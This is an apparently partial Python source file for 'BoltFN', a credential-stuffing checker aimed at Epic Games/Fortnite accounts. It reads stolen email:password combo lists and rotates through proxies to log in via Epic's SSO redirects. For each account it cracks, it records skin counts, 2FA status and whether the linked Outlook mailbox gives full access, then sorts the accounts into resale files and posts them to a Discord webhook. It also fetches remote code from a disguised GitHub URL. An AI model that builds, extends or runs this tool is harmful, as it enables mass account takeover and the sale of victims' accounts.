...
'''
        ...
        if r.status_code in [200, 201]:
            ...
            while True:
                try:
                    r = requests.get(
                        'https://rafffffw.githubuserwwfwontent.com/Shafwfweefwggymop/Bolf/main/boltchecker.py',
                        timeout=10)
...
''')
            ...
            while True:
                ...
                for line in lol:
                    proxies.append(line)
                    scrapedproxies = [
                        x for x in proxies if
                        x != '' and ':' in x and 'a' not in x and 'b' not in x and 'c' not in x and 'd' not in x and 'e' not in x and 'f' not in x and 'g' not in x and 'h' not in x and 't' not in x]
        ...
        while True:
            if not Checker.importFromFile:
                ...
                filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',
            ...
            while True:
                if not self.proxyapi:
                    if not Checker.importFromFile:
                        ...
                        filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',
                                                          filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                        if filename is None:
                            print(Fore.LIGHTRED_EX + "Invalid File.")
                            sleep(1)
            ...
            for category, entries in categorized_data.items():
                if entries:
                    ...
                    for entry in entries:
                        file.write(
                            f"FullAccess: {entry['fullAccess']} | VerifiedEmail: {entry['mail_verified']} | TwoFactor: {entry['2fa']} | Total Skins: {entry['total_skins']}\n")
                ...
                while True:
                    if checked_num != Checker.retries:
                        ...
                        headers = {
                            ...
                            "Content-Length": "814",
                            # Make sure the content length is correct; it's generally calculated automatically.
                        ...
                        while True:
                            try:
                                response = session.post(url, headers=headers, data=payload, proxies=self.proxies(),
                        ...
                        if result == 'Failure' or result == '2FACTOR' or result == 'Ban' or result == 'CUSTOM' or result == 'Unknown':
                            ...
                            if url:
                                try:
                                    ...
                                    while True:
                                        try:
                                            response = session.post(url2, headers=headers, data=payload,
                                                                    proxies=self.proxies(), timeout=Checker.timeout)
                                    ...
                                    while True:
                                        try:
                                            response = scraper.get(url, headers=headers, proxies=self.proxies(),
                                                                   timeout=Checker.timeout)
                                    ...
                                    while True:
                                        try:
                                            response = scraper.post(url, json=payload, headers=headers,
                                                                    cookies=response.cookies, proxies=self.proxies(),
                                                                    timeout=Checker.timeout)
                                        ...
                                        while True:
                                            ...
                                            try:
                                                response = scraper.get(url, headers=headers, allow_redirects=False,
                                                                       cookies=response.cookies, proxies=self.proxies(),
                                                                       timeout=Checker.timeout)
                                                if 'https://www.unrealengine.com:443/id/api/sso?sid=' in \
                                        ...
                                        while True:
                                            ...
                                            try:
                                                response = scraper.get(url, headers=headers, allow_redirects=False,
                                                                       cookies=response.cookies, proxies=self.proxies(),
                                                                       timeout=Checker.timeout)
                                                if 'https://www.twinmotion.com:443/id/api/sso?sid=' in response.headers[
                                                    'location']:
                                                    url = response.headers['location']
                                                    break
                                                else:
                                        ...
                                        while True:
                                            ...
                                            try:
                                                response = scraper.get(url, headers=headers, allow_redirects=False,
                                                                       cookies=response.cookies, proxies=self.proxies(),
                                                                       timeout=Checker.timeout)
                                                if 'https://www.fortnite.com:443/id/api/sso?' in response.headers[
                                                    'location']:
                                                    url = response.headers['location']
                                                    break
                                                else:
                                    ...
                                    headers = {
                                        ...
                                        # Replace this with the actual encoded credentials if necessary
                                        "Accept-Encoding": "gzip, deflate"
                                    }
                                    while True:
                                        try:
                                    ...
                                    try:
                                        ...
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, json={},
                                        ...
                                        data = response.json()
                                        past_seasons = data.get('profileChanges', [])[0].get('profile', {}).get('stats',
                                                                                                                {}).get(
                                            'attributes', {}).get('past_seasons', [])
                                        first_active_season = None
                                        for season in past_seasons:
                                            try:
                                                if season['seasonXp'] > 0:
                                                    if first_active_season is None or season['seasonNumber'] < \
                                                            first_active_season['seasonNumber']:
                                        ...
                                        processed_skins = [skin.replace("character_speeddial", "").strip() for skin in
                                                           unique_skins]
                                        exclusiveSkins = [
                                        ...
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, data=content,
                                                                        cookies=response.cookies,
                                                                        timeout=Checker.timeout, proxies=self.proxies())
                                                if response.status_code == 200:
                                                    data = response.json()
                                                    break
                                                else:
                                        ...
                                        try:
                                            ...
                                            pass
                                        fullAccess = 'NFA'
                                        outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr",
                                                           "live.com", "live.fr"]
                                        if epicEmail.lower() == email.lower() and any(
                                                domain in email.lower() for domain in outlook_domains):
                                            fullAccess = 'FA'
                                        Counter.skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins,
                                                                   "exclusive": exclusive})
                                        if not os.path.exists(self.folder + '/Fortnite'):
                                            os.makedirs(self.folder + '/Fortnite')
                                        ...
                                        Counter.sellerstuff.append(
                                            {"fullAccess": fullAccess, "2fa": tfa_enabled, "total_skins": total_skins,
                                             "skins_list": processed_skins, "exclusive": exclusive,
                                             "exclusives_list": exclusiveSkin, "mail_verified": email_verified_status})

                                        img_filename = f"{total_skins}_skins_{fullAccess}.png"
                                        img_filepath = os.path.join(self.folder, img_filename)
                                        log_error = lambda e: open(os.path.join(self.folder, "error_log.txt"),'a').write(f"{traceback.format_exc()}\n")

                                        try:
                                            skin_generator.generate(processed_skins, img_filepath)
                                        except Exception as e:
                                            log_error(e)
                                        ...
                                        if Checker.webhook.webhooky:
                                            payload = {
                                                ...
                                                "embeds": [
                                                    {
                                                        "author": {"name": "BOLTFN",
                                                                   "url": "https://github.com/Shaggymop/BoltFN",
                                                        ...
                                                        "fields": [
                                                            ...
                                                            {"name": "Skins",
                                                             "value": f'[{total_skins}] {processed_skins}'},
                                        ...
                                        if exclusive:
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                        ...
                                        if int(total_skins) == 0:
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/NoSkins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/1-9Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/10-49Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/50-99Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/100-199Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/200-299Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
                                            ...
                                            open(
                                                f'{self.folder}/Fortnite/300+Skins/{str(total_skins)} Skins {fullAccess}.txt',
                                                'a',
                                                encoding='u8').write(f'{message}\n')
    ...
    def follow_redirects(self, scraper, url, headers, cookies, retries, proxies, timeout):
        try:
            response = scraper.get(url, headers=headers, allow_redirects=False, cookies=cookies, proxies=self.proxies(),
                                   timeout=Checker.timeout)
    ...
    def title(self):
        while True:
            ...
            chek = int(Counter.bad) + int(
                Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
            estimated = 0
            if Checked > 0:
                ...
                if self.cuitype == 'cn':
                    ...
                    total_chars = sum(
                        line.count('█') + line.count('╔') + line.count('╗') + line.count('╚') + line.count(
                            '═') + line.count('║') for line in logo_colored)
                    chars_to_color = total_chars if Counter.checkedpercent >= 100 else int(
                        round(total_chars * Counter.checkedpercent / 100))
                    ...
                    print(
                        f'                                                {Fore.WHITE}[Progress: {Counter.checkedpercent:.2f}%{Fore.WHITE}]\n\n')
                    ...
                    print(
                        f" {Fore.WHITE}├── [{Counter.mshit - Counter.epic2fa - Counter.xb - Counter.headless}] {Fore.YELLOW}Not linked")
...
'''
                    ...
                    print(logo_colored)
                    print(
                        f'                                                  {Fore.MAGENTA}          [{Counter.checkedpercent:.2f}%]\n\n')
                    zeroskins = 0
                    oneplus = 0
                    tenplus = 0
                    fiftyplus = 0
                    ...
                    print_formatted("                                              [{1}]  Progress      [{0}/{2}]",
                                    checked, ">>", len(self.accounts), Fore.RED, Fore.WHITE)
                    print()
                    print_formatted("                                              [{1}]  Hits          [{0}]",
                                    Counter.hits, ">>", color1=Fore.GREEN)
                    print_formatted("                                              [{1}]  2fa           [{0}]",
                                    Counter.custom, ">>", color1=Fore.LIGHTYELLOW_EX)
                    print_formatted("                                              [{1}]  Epic 2fa      [{0}]",
                                    Counter.epic2fa, ">>", color1=Fore.YELLOW)
                    print_formatted("                                              [{1}]  Maybe FA      [{0}]", maybefa,
                                    ">>", color1=Fore.LIGHTMAGENTA_EX)
                    print_formatted("                                              [{1}]  Looted        [{0}]",
                                    Counter.locked, ">>", color1=Fore.LIGHTBLACK_EX)
                    print_formatted("                                              [{1}]  Fails         [{0}]",
                                    Counter.bad, ">>", color1=Fore.LIGHTRED_EX)
                    print()
                    print_formatted("                                              [{1}]  300+ Skins    [{0}]",
                                    threehundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  200+ Skins    [{0}]",
                                    twohundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  100+ Skins    [{0}]",
                                    onehundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  50+  Skins    [{0}]",
                                    fiftyplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  10+  Skins    [{0}]", tenplus,
                                    ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  1+   Skins    [{0}]", oneplus,
                                    ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  0    Skins    [{0}]",
                                    zeroskins, ">>", color1=Fore.RED)

                    print()
                    print_formatted("                                              [{1}]  STW           [{0}]",
                                    Counter.stw, ">>", color1=Fore.YELLOW)
                    print_formatted("                                              [{1}]  OGS           [{0}]",
                                    Counter.og, ">>", color1=Fore.MAGENTA)
                    print_formatted("                                              [{1}]  Rares         [{0}]",
                                    exclusivee, ">>", color1=Fore.CYAN)
                    print()
                    print_formatted("                                              [{1}]  Retries       [{0}]",
                                    Counter.retries, ">>", color1=Fore.LIGHTYELLOW_EX)
                    print_formatted("                                              [{1}]  CPM           [{0}]",
                                    Counter.cpm, ">>", color1=Fore.WHITE)
